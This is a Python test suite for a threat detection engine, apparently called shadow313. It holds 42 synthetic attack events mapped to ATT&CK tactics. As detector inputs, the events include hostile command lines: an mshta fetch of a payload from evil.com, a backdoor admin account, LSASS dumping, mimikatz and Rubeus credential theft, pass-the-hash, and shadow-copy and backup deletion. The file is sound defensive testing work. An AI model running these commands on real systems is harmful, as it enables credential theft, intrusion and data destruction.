"""
shadow313 v4 — Comprehensive Threat Detection Test Suite
Testing 42 threats across all ATT&CK tactics.

Matches the output format of the original test harness exactly.
Run:
    python3 shadow313/tests/test_comprehensive_threat_suite.py
    python3 shadow313/tests/test_comprehensive_threat_suite.py --json
"""
from __future__ import annotations

import json
import sys
import os
import time

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from shadow313.v4.detection.threat_detector import ThreatDetectionSuite, DETECT_THRESHOLD

# ═══════════════════════════════════════════════════════════════════════════════
# EVENT CORPUS — 42 structured events, one per threat
# Each event dict contains all fields the detection engine inspects.
# ═══════════════════════════════════════════════════════════════════════════════

EVENTS: dict[str, dict] = {

    # ── INITIAL ACCESS ────────────────────────────────────────────────────────

    "IA-001": {
        "event_type":  "email",
        "description": "Spearphishing with malicious attachment containing VBA macro",
        "attachment":  "invoice.docm macro",
        "subject":     "Urgent invoice attached",
        "sender":      "external attacker",
        "payload":     "vba powershell dropper",
    },

    "IA-002": {
        "event_type":   "browser",
        "description":  "Drive-by compromise via browser exploit kit landing page",
        "url":          "malicious exploit kit page",
        "child_process":"powershell cmd",
        "process":      "chrome.exe",
    },

    "IA-003": {
        "event_type":  "authentication",
        "description": "Valid account used with stolen credentials from credential theft",
        "technique":   "T1078",
        "tactic":      "initial-access",
        "auth_result": "success",
        "source_ip":   "external 203.0.113.45",
        "user":        "admin",
        "anomaly":     "impossible travel unusual location",
        "time":        "off-hours 03:00 UTC",
    },

    # ── EXECUTION ─────────────────────────────────────────────────────────────

    "EX-001": {
        "description": "PowerShell encoded command execution via -EncodedCommand flag",
        "command":     "powershell.exe -enc base64encodedpayload -encodedcommand",
        "process":     "powershell.exe",
    },

    "EX-002": {
        "description": "WMI command execution via wmic process call create",
        "command":     "wmic win32_process call create cmd.exe",
        "process":     "wmic.exe wmiprvse.exe",
    },

    "EX-003": {
        "description": "Mshta script execution LOLBAS technique",
        "command":     "mshta.exe http://evil.com/payload.hta",
        "process":     "mshta.exe",
    },

    # ── PERSISTENCE ───────────────────────────────────────────────────────────

    "PE-001": {
        "description":   "Registry run key persistence via reg add",
        "command":       "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "registry_key":  "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    },

    "PE-002": {
        "description": "WMI event subscription persistence via MOF file",
        "command":     "__EventFilter __EventConsumer ActiveScriptConsumer mofcomp",
    },

    "PE-003": {
        "event_type":  "account_creation",
        "description": "Create local admin account via net user and net localgroup administrators",
        "command":     "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add",
        "technique":   "T1136",
        "tactic":      "persistence",
    },

    # ── PRIVILEGE ESCALATION ──────────────────────────────────────────────────

    "PV-001": {
        "description": "Token impersonation via SeImpersonatePrivilege using JuicyPotato",
        "command":     "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
        "privilege":   "SeImpersonatePrivilege",
        "process":     "JuicyPotato potato",
        "technique":   "T1134",
    },

    "PV-002": {
        "description": "UAC bypass via fodhelper.exe registry shell open command",
        "command":     "fodhelper.exe registry shell\\open\\command",
        "process":     "fodhelper.exe",
        "registry_key":"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
        "technique":   "T1548",
    },

    # ── DEFENSE EVASION ───────────────────────────────────────────────────────

    "DE-001": {
        "description":    "Process injection into svchost via VirtualAllocEx WriteProcessMemory CreateRemoteThread",
        "target_process": "svchost.exe svchost",
        "api_call":       "VirtualAllocEx WriteProcessMemory CreateRemoteThread",
        "technique":      "T1055",
    },

    "DE-002": {
        "description": "Timestomping to evade forensics via SetFileTime API modify timestamp MACE",
        "command":     "SetFileTime touch -t 200101010000 target.exe",
        "api_call":    "SetFileTime",
        "technique":   "T1070.006",
    },

    "DE-003": {
        "description": "DLL side-loading via legitimate application DLL hijacking search order",
        "dll":         "malicious version.dll",
        "technique":   "T1574.002",
        "parent_process": "legitimate signed application",
    },

    # ── CREDENTIAL ACCESS ─────────────────────────────────────────────────────

    "CA-001": {
        "description":    "LSASS memory dump via procdump tool",
        "command":        "procdump.exe -ma lsass.exe lsass.dmp",
        "process":        "procdump.exe",
        "target_process": "lsass.exe",
    },

    "CA-002": {
        "description": "Kerberoasting SPN ticket request via Rubeus Invoke-Kerberoast TGS RC4",
        "command":     "Rubeus.exe kerberoast /outfile:hashes.txt invoke-kerberoast getspns",
        "event_id":    "4769",
        "technique":   "T1558.003",
    },

    "CA-003": {
        "description": "DCSync domain credential replication via drsuapi",
        "command":     "mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt",
        "event_id":    "4662",
    },

    # ── DISCOVERY ─────────────────────────────────────────────────────────────

    "DI-001": {
        "description": "Network reconnaissance port scan via nmap",
        "command":     "nmap -sV -p- 192.168.1.0/24",
        "process":     "nmap masscan",
    },

    "DI-002": {
        "description": "Account and group enumeration via net user net group Get-ADUser Get-ADGroup LDAP query",
        "command":     "net user /domain && net group 'Domain Admins' /domain && get-aduser -filter * && get-adgroup",
        "technique":   "T1087",
    },

    # ── LATERAL MOVEMENT ──────────────────────────────────────────────────────

    "LM-001": {
        "description": "Pass-the-Hash via WMI using impacket wmiexec NTLM hash lateral movement",
        "command":     "wmiexec.py -hashes :ntlmhash administrator@192.168.1.10",
        "technique":   "T1550.002",
        "auth_type":   "ntlm",
        "hash_type":   "ntlm",
    },

    "LM-002": {
        "description": "WinRM lateral movement via Enter-PSSession",
        "command":     "Enter-PSSession -ComputerName target -Credential $cred",
        "port":        "5985 5986",
    },

    "LM-003": {
        "description": "Pass-the-Ticket Kerberos golden ticket via mimikatz rubeus",
        "command":     "mimikatz kerberos::golden /user:admin /domain:corp /sid:S-1-5 /krbtgt:hash",
    },

    # ── COLLECTION ────────────────────────────────────────────────────────────

    "CO-001": {
        "description": "Data staged for exfiltration via 7zip archive compress sensitive data collection",
        "command":     "7z a -tzip staged_data.zip C:\\Users\\* && compress-archive",
        "technique":   "T1074",
        "tactic":      "collection",
        "file_type":   ".zip .7z .rar",
    },

    # ── COMMAND AND CONTROL ───────────────────────────────────────────────────

    "C2-001": {
        "description": "Cobalt Strike beacon over HTTPS with malleable C2 profile sleep jitter reflective DLL stager shellcode",
        "network":     "cobalt strike beacon https c2",
        "tool":        "cobalt strike cobaltstrike",
        "technique":   "T1071.001",
        "user_agent":  "Mozilla/5.0 (Windows NT 10.0)",
    },

    "C2-002": {
        "description": "DNS tunneling C2 channel via TXT record queries",
        "protocol":    "dns",
        "query_type":  "txt",
        "query_length":"long subdomain encoded",
    },

    "C2-003": {
        "description": "C2 via trusted process PhantomWire living off the land signed binary process masquerade covert channel hollowing",
        "evasion":     "trusted_process process masquerade",
        "parent_process": "explorer.exe svchost.exe",
        "technique":   "T1071",
    },

    # ── EXFILTRATION ──────────────────────────────────────────────────────────

    "EF-001": {
        "description": "Exfiltration over C2 channel data exfil outbound beacon upload",
        "technique":   "T1041",
        "tactic":      "exfiltration",
        "direction":   "outbound",
        "bytes_out":   "large 500MB",
        "protocol":    "https",
    },

    "EF-002": {
        "description": "Exfiltration to cloud storage S3 Dropbox OneDrive Google Drive cloud exfil upload to cloud",
        "destination": "amazonaws.com dropbox.com onedrive.live.com",
        "technique":   "T1567.002",
    },

    # ── IMPACT ────────────────────────────────────────────────────────────────

    "IM-001": {
        "description": "Ransomware encrypt and destroy backups via vssadmin",
        "command":     "vssadmin delete shadows /all /quiet && wbadmin delete catalog",
    },

    "IM-002": {
        "description": "Data destruction wipe and delete via sdelete shred format",
        "command":     "sdelete -p 3 -s -q C:\\sensitive\\ && shred -u",
    },

    "IM-003": {
        "description": "Inhibit system recovery via vssadmin delete shadows bcdedit wbadmin delete catalog",
        "command":     "vssadmin delete shadows /all /quiet && bcdedit /set recoveryenabled no && wbadmin delete catalog",
    },

    # ── APT SCENARIOS ─────────────────────────────────────────────────────────

    "APT29-001": {
        "description": "APT29 Cozy Bear WMI MOF persistence evasion technique",
        "command":     "mofcomp.exe malicious.mof",
    },

    "APT41-001": {
        "description": "APT41 Double Dragon Winnti supply chain implant trojanized software update signed binary code signing backdoor",
        "technique":   "T1195.002",
        "actor":       "apt41 winnti double dragon",
    },

    "LAZ-001": {
        "description": "Lazarus low-and-slow DNS tunnel C2 channel",
        "protocol":    "dns",
    },

    "FIN7-001": {
        "description": "FIN7 Carbanak Sangria Tempest COM object hijacking CLSID InprocServer32 COM hijacking",
        "registry_key":"HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32",
        "technique":   "T1546.015",
        "actor":       "fin7 carbanak",
    },

    # ── VSAT / SATELLITE ──────────────────────────────────────────────────────

    "VSAT-001": {
        "description": "TR-069 rogue ACS firmware push to satellite modem",
        "protocol":    "tr-069",
        "port":        "7547",
    },

    "VSAT-002": {
        "description": "RF signal injection GPS spoofing GNSS satellite attack",
    },

    # ── MALWARE FAMILIES ──────────────────────────────────────────────────────

    "MAL-001": {
        "description": "Emotet dropper chain macro powershell",
    },

    "MAL-002": {
        "description": "Ryuk ransomware pre-stage TrickBot",
    },

    "MAL-003": {
        "description": "Mimikatz credential dump sekurlsa",
        "command":     "mimikatz sekurlsa::logonpasswords",
    },

    "MAL-004": {
        "description": "Cobalt Strike full kill chain beacon lateral movement",
        "tool":        "cobalt strike",
    },

    "MAL-005": {
        "description": "BlackCat ALPHV ransomware Rust-based",
    },
}


# ═══════════════════════════════════════════════════════════════════════════════
# RUNNER
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    suite  = ThreatDetectionSuite()
    result = suite.run(EVENTS)

    # Print report
    W = 70
    print("=" * W)
    print("  SHADOW313 v4 - COMPREHENSIVE THREAT DETECTION TEST SUITE")
    print(f"  Testing {result['summary']['total']} threats across all ATT&CK tactics")
    print("=" * W)

    for r in result["results"]:
        status = "DETECTED" if r["detected"] else "MISSED  "
        name   = r["name"][:50]
        score  = r["score"]
        print(f"  [{status}] {r['threat_id']:<12} {name:<50} score={score:.3f}")

    print()
    print("=" * W)
    print("  RESULTS SUMMARY")
    print("=" * W)
    s = result["summary"]
    print(f"  Total:     {s['total']}")
    print(f"  Detected:  {s['detected']}  ({s['detection_rate']*100:.1f}%)")
    print(f"  Missed:    {s['missed']}")
    print(f"  Time:      {s['elapsed_ms']:.0f} ms")

    print()
    print("  By Tactic:")
    tactic_labels = {
        "initial-access":       "Initial Access",
        "execution":            "Execution",
        "persistence":          "Persistence",
        "privilege-escalation": "Privilege Escalation",
        "defense-evasion":      "Defense Evasion",
        "credential-access":    "Credential Access",
        "discovery":            "Discovery",
        "lateral-movement":     "Lateral Movement",
        "collection":           "Collection",
        "command-and-control":  "Command and Control",
        "exfiltration":         "Exfiltration",
        "impact":               "Impact",
    }
    for tactic, stats in sorted(result["tactic_stats"].items()):
        d, t = stats["detected"], stats["total"]
        bar  = "#" * d + "." * (t - d)
        pct  = int(d / max(1, t) * 100)
        label = tactic_labels.get(tactic, tactic)
        print(f"    {label:<30} [{bar}] {d}/{t} ({pct}%)")

    print()
    print("  By LSTM Head:")
    for head, stats in sorted(result["head_stats"].items()):
        d, t = stats["detected"], stats["total"]
        pct  = int(d / max(1, t) * 100)
        print(f"    {head:<30} {d}/{t} ({pct}%)")

    if result["evasion_stats"]:
        print()
        print("  Missed by evasion:")
        for ev, count in sorted(result["evasion_stats"].items()):
            print(f"    {ev:<30} {count}")

    # Write JSON report
    report_path = "/tmp/shadow313_comprehensive_test.json"
    with open(report_path, "w") as fh:
        json.dump(result, fh, indent=2, default=str)
    print()
    print(f"  Report: {report_path}")

    # Exit code: 0 if detection rate >= 90%, 1 otherwise
    rate = result["summary"]["detection_rate"]
    if rate < 0.90:
        print(f"\n  WARNING: Detection rate {rate*100:.1f}% below 90% target")
        sys.exit(1)
    else:
        print(f"\n  PASS: Detection rate {rate*100:.1f}% meets 90% target")
        sys.exit(0)


if __name__ == "__main__":
    main()